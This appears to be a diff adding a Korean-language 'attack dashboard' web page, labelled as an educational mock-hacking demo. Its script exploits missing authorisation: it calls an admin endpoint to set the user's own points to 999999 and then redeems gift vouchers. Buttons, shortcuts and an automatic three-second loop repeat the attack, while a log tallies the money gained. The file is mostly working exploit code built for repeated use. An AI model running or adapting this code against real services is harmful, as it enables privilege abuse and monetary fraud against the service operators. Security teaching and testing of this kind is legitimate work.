@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 공격 대시보드 (Live Demo)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px #00ff00;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { text-shadow: 0 0 10px #00ff00; }
+            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+        }
+
+        .warning {
+            background: #ff0000;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .panel {
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+
+        .panel h2 {
+            color: #ffff00;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+        }
+
+        .stat-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: #000;
+            border-radius: 5px;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            color: #00ff00;
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            color: #ff6b6b;
+            font-weight: bold;
+            text-shadow: 0 0 5px #ff6b6b;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 8px;
+            background: #000;
+            border-radius: 5px;
+        }
+
+        .info-label {
+            color: #00ff00;
+        }
+
+        .info-value {
+            color: #ffffff;
+            font-weight: bold;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 40px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 15px;
+            border: 2px solid #00ff00;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 1.2rem;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .control-panel {
+            text-align: center;
+            padding: 30px;
+        }
+
+        button {
+            background: linear-gradient(45deg, #ff6b6b, #ff4444);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            border-radius: 10px;
+            margin: 10px;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+            font-family: 'Consolas', monospace;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button.stop {
+            background: linear-gradient(45deg, #666, #444);
+        }
+
+        button.clear {
+            background: linear-gradient(45deg, #333, #222);
+        }
+
+        .log {
+            background: #000;
+            padding: 15px;
+            height: 350px;
+            overflow-y: auto;
+            font-size: 0.9rem;
+            margin-top: 15px;
+            border-radius: 5px;
+            border: 2px solid #00ff00;
+        }
+
+        .log::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        .log::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+
+        .log::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 5px;
+        }
+
+        .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid transparent;
+            padding-left: 10px;
+        }
+
+        .success {
+            color: #00ff00;
+            border-left-color: #00ff00;
+        }
+
+        .error {
+            color: #ff0000;
+            border-left-color: #ff0000;
+        }
+
+        .info {
+            color: #ffff00;
+            border-left-color: #ffff00;
+        }
+
+        .separator {
+            color: #666;
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .pulse {
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .attack-status {
+            background: #000;
+            border: 2px solid #ff6b6b;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .attack-status.active {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { border-color: #ff6b6b; }
+            50% { border-color: #ff0000; }
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            button {
+                padding: 12px 20px;
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ 교육 목적의 모의해킹 시연 페이지입니다. 실제 운영 환경에서 사용 금지!
+    </div>
+
+    <h1>🎯 실시간 공격 대시보드</h1>
+
+    <div class="grid">
+        <!-- 공격 통계 패널 -->
+        <div class="panel">
+            <h2>📊 공격 통계</h2>
+
+            <div class="stat-container">
+                <span class="stat-label">현재 포인트</span>
+                <span class="stat-value" id="currentPoints">0</span>
+            </div>
+
+            <div class="stat-container">
+                <span class="stat-label">총 교환 횟수</span>
+                <span class="stat-value" id="totalExchanges">0</span>
+            </div>
+
+            <div class="stat-container">
+                <span class="stat-label">획득 문상 가치</span>
+                <span class="stat-value" id="totalValue">0 원</span>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar" style="width: 0%">0%</div>
+            </div>
+
+            <div class="attack-status" id="attackStatus">
+                <span>⏸️ 대기 중</span>
+            </div>
+        </div>
+
+        <!-- 사용자 정보 패널 -->
+        <div class="panel">
+            <h2>👤 공격자 정보</h2>
+
+            <div class="info-item">
+                <span class="info-label">User ID:</span>
+                <span class="info-value" id="userId">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">Username:</span>
+                <span class="info-value" id="username">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">Email:</span>
+                <span class="info-value" id="email">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">Role:</span>
+                <span class="info-value" id="role">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">초기 포인트:</span>
+                <span class="info-value" id="initialPoints">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">공격 시작 시간:</span>
+                <span class="info-value" id="attackStartTime">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">경과 시간:</span>
+                <span class="info-value" id="elapsedTime">00:00:00</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 컨트롤 패널 -->
+    <div class="panel control-panel">
+        <h2>🎮 공격 컨트롤</h2>
+        <button onclick="singleAttack()">⚡ 1회 공격 실행</button>
+        <button onclick="attackMultiple(5)">💥 5회 연속 공격</button>
+        <button onclick="startAutoAttack()" id="autoBtn">🚀 자동 공격 시작</button>
+        <button onclick="stopAutoAttack()" class="stop">⛔ 중지</button>
+        <button onclick="clearLogs()" class="clear">🗑️ 로그 삭제</button>
+    </div>
+
+    <!-- 실시간 로그 -->
+    <div class="panel">
+        <h2>📜 실시간 공격 로그</h2>
+        <div class="log" id="logContainer"></div>
+    </div>
+
+    <script>
+        let attackInterval = null;
+        let totalExchanges = 0;
+        let currentUser = null;
+        let initialPoints = 0;
+        let attackStartTime = null;
+        let elapsedTimer = null;
+
+        // 초기화
+        async function init() {
+            addLog('🔧 시스템 초기화 중...', 'info');
+
+            try {
+                const response = await fetch('/api/auth/me', { credentials: 'include' });
+
+                if (!response.ok) {
+                    addLog('❌ 로그인이 필요합니다. /login.html로 이동하세요.', 'error');
+                    setTimeout(() => {
+                        if (!currentUser) {
+                            window.location.href = '/login.html';
+                        }
+                    }, 3000);
+                    return;
+                }
+
+                currentUser = await response.json();
+                initialPoints = currentUser.points;
+
+                // 사용자 정보 표시
+                document.getElementById('userId').textContent = currentUser.userId;
+                document.getElementById('username').textContent = currentUser.username;
+                document.getElementById('email').textContent = currentUser.email;
+                document.getElementById('role').textContent = currentUser.role;
+                document.getElementById('initialPoints').textContent = initialPoints.toLocaleString();
+                document.getElementById('currentPoints').textContent = currentUser.points.toLocaleString();
+
+                addLog(`✅ 초기화 완료: ${currentUser.username} (ID: ${currentUser.userId})`, 'success');
+                addLog(`   현재 포인트: ${currentUser.points.toLocaleString()}`, 'info');
+                addLog(`   역할: ${currentUser.role}`, 'info');
+                addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'separator');
+
+            } catch (error) {
+                addLog('❌ 초기화 실패: ' + error.message, 'error');
+            }
+        }
+
+        // 경과 시간 업데이트
+        function startElapsedTimer() {
+            if (!attackStartTime) {
+                attackStartTime = new Date();
+                document.getElementById('attackStartTime').textContent = attackStartTime.toLocaleTimeString();
+            }
+
+            if (!elapsedTimer) {
+                elapsedTimer = setInterval(() => {
+                    const now = new Date();
+                    const diff = Math.floor((now - attackStartTime) / 1000);
+                    const hours = String(Math.floor(diff / 3600)).padStart(2, '0');
+                    const minutes = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
+                    const seconds = String(diff % 60).padStart(2, '0');
+                    document.getElementById('elapsedTime').textContent = `${hours}:${minutes}:${seconds}`;
+                }, 1000);
+            }
+        }
+
+        // 1회 공격
+        async function singleAttack() {
+            if (!currentUser) {
+                addLog('❌ 초기화가 필요합니다.', 'error');
+                return;
+            }
+
+            startElapsedTimer();
+
+            addLog('⚡ 공격 시작...', 'info');
+
+            try {
+                // 1단계: 포인트 조작
+                addLog('  [1/3] 포인트 조작 시도...', 'info');
+                const pointResponse = await fetch(`/admin/api/users/${currentUser.userId}/points`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ points: 999999 }),
+                    credentials: 'include'
+                });
+
+                const pointData = await pointResponse.json();
+
+                if (pointData.success) {
+                    addLog(`  ✅ 포인트 조작 성공: ${pointData.newPoints.toLocaleString()}`, 'success');
+                    document.getElementById('currentPoints').textContent = pointData.newPoints.toLocaleString();
+                } else {
+                    throw new Error(pointData.error || '포인트 조작 실패');
+                }
+
+                // 2단계: 문화상품권 교환
+                addLog('  [2/3] 문화상품권 교환 시도...', 'info');
+                const voucherResponse = await fetch('/api/auth/exchange-voucher', {
+                    method: 'POST',
+                    credentials: 'include'
+                });
+
+                const voucherData = await voucherResponse.json();
+
+                if (voucherData.success) {
+                    totalExchanges++;
+                    const totalValue = totalExchanges * 5000;
+
+                    addLog(`  🎁 교환 성공! (${totalExchanges}번째)`, 'success');
+                    addLog(`     메시지: ${voucherData.message}`, 'info');
+                    addLog(`     남은 포인트: ${voucherData.remainingPoints.toLocaleString()}`, 'info');
+
+                    // 통계 업데이트
+                    document.getElementById('totalExchanges').textContent = totalExchanges;
+                    document.getElementById('totalValue').textContent = totalValue.toLocaleString() + ' 원';
+                    document.getElementById('currentPoints').textContent = voucherData.remainingPoints.toLocaleString();
+
+                    // 진행률 업데이트 (20회 기준)
+                    const progress = Math.min((totalExchanges / 20) * 100, 100);
+                    const progressBar = document.getElementById('progressBar');
+                    progressBar.style.width = progress + '%';
+                    progressBar.textContent = Math.floor(progress) + '%';
+
+                    if (progress >= 100) {
+                        addLog('🏆 목표 달성! (20회 교환 완료 = 100,000원)', 'success');
+                    }
+                } else {
+                    throw new Error(voucherData.message || '교환 실패');
+                }
+
+                addLog('  [3/3] ✅ 공격 완료!', 'success');
+                addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'separator');
+
+            } catch (error) {
+                addLog('❌ 공격 실패: ' + error.message, 'error');
+                addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'separator');
+            }
+        }
+
+        // 연속 공격
+        async function attackMultiple(count) {
+            addLog(`🔥 ${count}회 연속 공격 시작...`, 'success');
+
+            for (let i = 0; i < count; i++) {
+                addLog(`\n[${i + 1}/${count}회 차]`, 'info');
+                await singleAttack();
+
+                if (i < count - 1) {
+                    addLog('⏳ 1초 대기...', 'info');
+                    await sleep(1000);
+                }
+            }
+
+            addLog(`\n🎉 ${count}회 연속 공격 완료!`, 'success');
+            addLog(`💰 총 획득 가치: ${(totalExchanges * 5000).toLocaleString()} 원`, 'success');
+        }
+
+        // 자동 공격 시작
+        function startAutoAttack() {
+            if (attackInterval) {
+                addLog('⚠️ 이미 자동 공격이 실행 중입니다.', 'error');
+                return;
+            }
+
+            const statusEl = document.getElementById('attackStatus');
+            statusEl.innerHTML = '<span class="pulse">🔴 자동 공격 실행 중...</span>';
+            statusEl.classList.add('active');
+
+            addLog('🚀 자동 공격 모드 시작 (3초마다 실행)', 'success');
+            addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'separator');
+
+            attackInterval = setInterval(singleAttack, 3000);
+        }
+
+        // 자동 공격 중지
+        function stopAutoAttack() {
+            if (attackInterval) {
+                clearInterval(attackInterval);
+                attackInterval = null;
+
+                const statusEl = document.getElementById('attackStatus');
+                statusEl.innerHTML = '<span>⏸️ 대기 중</span>';
+                statusEl.classList.remove('active');
+
+                addLog('⛔ 자동 공격 중지됨', 'info');
+                addLog(`📊 최종 통계: ${totalExchanges}회 교환, ${(totalExchanges * 5000).toLocaleString()}원 획득`, 'success');
+                addLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'separator');
+            } else {
+                addLog('⚠️ 실행 중인 자동 공격이 없습니다.', 'error');
+            }
+        }
+
+        // 로그 추가
+        function addLog(message, type = 'info') {
+            const logContainer = document.getElementById('logContainer');
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+
+            if (type === 'separator') {
+                logEntry.textContent = message;
+            } else {
+                logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            }
+
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        // 로그 삭제
+        function clearLogs() {
+            const confirmClear = confirm('정말로 모든 로그를 삭제하시겠습니까?');
+            if (confirmClear) {
+                document.getElementById('logContainer').innerHTML = '';
+                addLog('🗑️ 로그가 삭제되었습니다.', 'info');
+            }
+        }
+
+        // Sleep 함수
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // 페이지 로드 시 초기화
+        window.onload = function() {
+            init();
+        };
+
+        // 페이지 언로드 시 정리
+        window.onbeforeunload = function() {
+            if (attackInterval) {
+                stopAutoAttack();
+            }
+            if (elapsedTimer) {
+                clearInterval(elapsedTimer);
+            }
+        };
+
+        // 키보드 단축키
+        document.addEventListener('keydown', function(e) {
+            // Ctrl + Enter: 1회 공격
+            if (e.ctrlKey && e.key === 'Enter') {
+                e.preventDefault();
+                singleAttack();
+            }
+            // Ctrl + Shift + Enter: 자동 공격 토글
+            else if (e.ctrlKey && e.shiftKey && e.key === 'Enter') {
+                e.preventDefault();
+                if (attackInterval) {
+                    stopAutoAttack();
+                } else {
+                    startAutoAttack();
+                }
+            }
+            // Escape: 중지
+            else if (e.key === 'Escape') {
+                e.preventDefault();
+                stopAutoAttack();
+            }
+        });
+    </script>
+</body>
+</html>
